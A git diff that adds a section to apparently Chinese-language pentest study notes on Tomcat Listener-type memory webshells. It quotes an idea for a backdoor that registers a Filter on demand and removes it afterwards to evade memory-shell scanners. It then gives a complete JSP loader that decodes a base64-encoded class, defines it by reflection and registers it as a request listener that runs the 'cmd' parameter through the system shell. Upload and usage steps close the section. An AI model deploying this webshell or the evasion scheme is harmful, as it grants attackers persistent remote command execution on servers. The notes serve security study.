@@ -240,6 +240,112 @@ public class BasicListener implements ServletRequestListener {
 
 ---
 
+## 其他用法思路
+
+[JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#listener-内存马) 作者后记:
+
+除了 EventListener，Tomcat 还存在了一个 LifecycleListener ，当然也肯定有可以用来触发的实现类，但是用起来一定是不如 ServletRequestListener ，但是也可以关注一下。这里将不会进行演示。
+
+由于在 ServletRequestListener 中可以获取到 ServletRequestEvent，这其中又存了很多东西，ServletContext/StandardContext 都可以获取到，那玩法就变得更多了。可以根据不同思路实现很多非常神奇的功能，我举个例子：
+
+- 在 requestInitialized 中监听，如果访问到了某个特定的 URL，或这次请求中包含某些特征（可以拿到 request 对象，随便怎么定义），则新起一个线程去 StandardContext 中注册一个 Filter，可以实现某些恶意功能。
+- 在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。
+
+这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删。平常使用扫内存马的软件也根本扫不出来。这个例子也是我突然拍脑袋想出来的，可能实际意义并不大，但是可以看出 Listener 内存马的危害性和玩法的变化要大于 Filter/Servlet 内存马的。
+
+---
+
+## JSP马
+
+类似前面构造 Servlet JSP 马一样来写, 需要额外导入一个 `javax.servlet.ServletRequestListener` 来做类型转换:
+
+```jsp
+<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.Wrapper" %> 
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="java.util.Base64" %>
+<%@ page import="java.lang.reflect.Method" %>
+<%@ page import="javax.servlet.ServletRequestListener" %>
+
+<%!
+    String SUMMER_CMD_LISTENER_CLASS_STRING_BASE64 = "yv66vgAAAEEAzwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsHAA4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlCgACABAMABEAEgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAFAEAB3JlcXVlc3QKABYAFwcAGAwAGQAaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAHAAdBwAeDAAfACABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAcACIMACMAJAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAmAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAoAJQAoDAApACoBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwgALAEAGHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOAsALgAvBwAwDAAxADIBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAA0AQAFVVRGLTgLAC4ANgwANwAyAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcLAC4AOQwAOgA7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAD0BAB90aGlzIGlzIGEgU3VtbWVyQ01ETGlzdGVuZXI8YnI+CgA/AEAHAEEMAEIAMgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuCABEAQADY21kCwBGAEcHAEgMAEkASgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcATAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcATgEAEGphdmEvbGFuZy9TdHJpbmcIAFABAAZ3aG9hbWkKAEsAUgwABQBTAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoASwBVDABWAFcBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAWQBaBwBbDABcAF0BABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAF8BABFqYXZhL3V0aWwvU2Nhbm5lcgoAXgBhDAAFAGIBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAGQBAAJcYQoAXgBmDABnAGgBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAF4AagwAawBsAQAHaGFzTmV4dAEAAygpWgoAXgBuDABvAHABAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsIAHIBAAAIAHQBAAFcCgBNAHYMAHcAeAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCgBeAHoMAHsABgEABWNsb3NlBwB9AQATamF2YS9sYW5nL1Rocm93YWJsZQoAfAB/DACAAIEBAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWCACDAQACc2gIAIUBAAItYwgAhwEAB2NtZC5leGUIAIkBAAIvYwoAiwCMBwCNDACOAI8BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAIsAkQwAkgCTAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKAD8AlQwAlgAGAQAFZmx1c2gKAD8AegcAmQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAJgAmwwAnAAGAQAPcHJpbnRTdGFja1RyYWNlBwCeAQAfY29tL3N1bW1lcjIzMy9TdW1tZXJDTURMaXN0ZW5lcgcAoAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9zdW1tZXIyMzMvU3VtbWVyQ01ETGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAIb3V0cHV0T1MBABJMamF2YS9sYW5nL1N0cmluZzsBAAlzY2FubmVyT1MBABNMamF2YS91dGlsL1NjYW5uZXI7AQAOcmVzcG9uc2VXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAZvdXRwdXQBAAFzAQAHaXNMaW51eAEAAVoBABBwcm9jZXNzQnVpbGRlck9TAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAlwcm9jZXNzT1MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAEaW5PUwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAdodHRwUmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEdmFyNQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUHAMoBABNqYXZhL2lvL0lucHV0U3RyZWFtBwC5AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAFlN1bW1lckNNRExpc3RlbmVyLmphdmEAIQCdAAIAAQCfAAAAAwABAAUABgABAKEAAAAzAAEAAQAAAAUqtwABsQAAAAIAogAAAAoAAgAAABEABAASAKMAAAAMAAEAAAAFAKQApQAAAAEApgCnAAEAoQAABKkABgATAAABpSu2AAfAAA1NLLYADxITtgAVTi0EtgAbLSy2ACHAACU6BBkEtgAnOgUZBRIruQAtAgAZBRIzuQA1AgAZBbkAOAEAEjy2AD4ZBDoGGQYSQ7kARQIAOgcZB8YBRQQ2CLsAS1kEvQBNWQMST1O3AFE6CRkJtgBUOgoZCrYAWDoLuwBeWRkLtwBgEmO2AGU6DBkMtgBpmQALGQy2AG2nAAUScToNGQ0Sc7YAdZkABgM2CBkMxgAmGQy2AHmnAB46DRkMxgAUGQy2AHmnAAw6DhkNGQ62AH4ZDb8VCJkAGQa9AE1ZAxKCU1kEEoRTWQUZB1OnABYGvQBNWQMShlNZBBKIU1kFGQdTOgy4AIoZDLYAkLYAWDoNuwBeWRkNtwBgEmO2AGU6DhkOtgBpmQALGQ62AG2nAAUScToPGQW5ADgBADoQGRAZD7YAPhkQtgCUGRDGACYZELYAl6cAHjoRGRDGABQZELYAl6cADDoSGREZErYAfhkRvxkOxgAmGQ62AHmnAB46DxkOxgAUGQ62AHmnAAw6EBkPGRC2AH4ZD7+nAAhNLLYAmrEABwCNAK4AuwB8AMIAxwDKAHwBQAFMAVkAfAFgAWUBaAB8ASMBdAGBAHwBiAGNAZAAfAAAAZwBnwCYAAMAogAAAJYAJQAAABYACAAXABIAGAAXABkAIQAaACgAGwAxABwAOgAdAEYAHwBKACAAVQAhAFoAIgBdACMAbwAkAHYAJQB9ACYAjQAnAKEAKQCrACoArgAsALsAJgDWAC0A8QAuAQYALwETADABIwAxATcAMgFAADMBRwA0AUwANQFZADIBdAA2AYEAMAGcADoBnwA4AaAAOQGkADwAowAAAMoAFAChAA0AqACpAA0AjQBJAKoAqwAMAUAANACsAK0AEAE3AD0ArgCpAA8BIwB5AK8AqwAOAF0BPwCwALEACABvAS0AsgCzAAkAdgEmALQAtQAKAH0BHwC2ALcACwEGAJYAuAC5AAwBEwCJALoAtwANAAgBlAAUALsAAgASAYoAvAC9AAMAIQF7AL4AvwAEACgBdADAAMEABQBKAVIAwgDDAAYAVQFHAEQAqQAHAaAABADEAMUAAgAAAaUApAClAAAAAAGlAMYAxwABAMgAAAFOABX/AJ0ADQcAnQcACAcADQcAHAcAJQcALgcARgcATQEHAEsHAFkHAMkHAF4AAEEHAE0OTAcAfP8ADgAOBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAXgcAfAABBwB8CPkAAhpSBwDL/gAuBwDLBwDJBwBeQQcATf8AIwARBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcATQcAPwABBwB8/wAOABIHAJ0HAAgHAA0HABwHACUHAC4HAEYHAE0BBwBLBwBZBwDJBwDLBwDJBwBeBwBNBwA/BwB8AAEHAHwI+AACTAcAfP8ADgAQBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcAfAABBwB8CP8AAgACBwCdBwAIAABCBwCYBAABAMwApwABAKEAAAA1AAAAAgAAAAGxAAAAAgCiAAAABgABAAAAPwCjAAAAFgACAAAAAQCkAKUAAAAAAAEAxgDHAAEAAQDNAAAAAgDO";
+    
+    // 获取当前线程的上下文类加载器 ClassLoader
+    ClassLoader loader = Thread.currentThread().getContextClassLoader();
+    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
+    Base64.Decoder base64Decoder = Base64.getDecoder();
+    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_LISTENER_CLASS_STRING_BASE64);
+
+    Method method = null;
+    Class<?> clz = loader.getClass();
+    Class<?> listenerClass = null;
+%>
+
+<%
+    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
+    // Object 类为止
+    while (method == null && clz != Object.class) {
+        try {
+            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        } catch (NoSuchMethodException ex) {
+            clz = clz.getSuperclass();
+        }
+    }
+    if (method != null) {
+        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
+        method.setAccessible(true);
+        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
+        listenerClass = (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
+    }
+
+    // 获取StandardContext
+    StandardContext standardCtx = null;
+    ServletContext servletContext = request.getServletContext();
+    Field appContextField = servletContext.getClass().getDeclaredField("context");
+    appContextField.setAccessible(true);
+    Object appContext = appContextField.get(servletContext);
+
+    Field standardCtxField = appContext.getClass().getDeclaredField("context");
+    standardCtxField.setAccessible(true);
+    standardCtx = (StandardContext) standardCtxField.get(appContext);
+
+    if (standardCtx != null) {
+        // 添加监听器
+        standardCtx.addApplicationEventListener((ServletRequestListener) listenerClass.getDeclaredConstructor().newInstance());
+
+
+        out.println("Successfully added a new listener By Base64 Class String to StandardContext");
+    } else {
+        out.println("Failed to get StandardContext");
+    }
+%>
+```
+
+上传到 tomcat webapps 目录下, 比如上传到 ROOT 目录里:
+
+![image-20241010113512205](http://cdn.ayusummer233.top/DailyNotes/202410101135319.png)
+
+直接测试命令执行: `/dynamicAddListenerBase64Class.jsp?cmd=whoami`
+
+![image-20241010113622848](http://cdn.ayusummer233.top/DailyNotes/202410101136899.png)
+
+![image-20241010113715324](http://cdn.ayusummer233.top/DailyNotes/202410101137391.png)
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
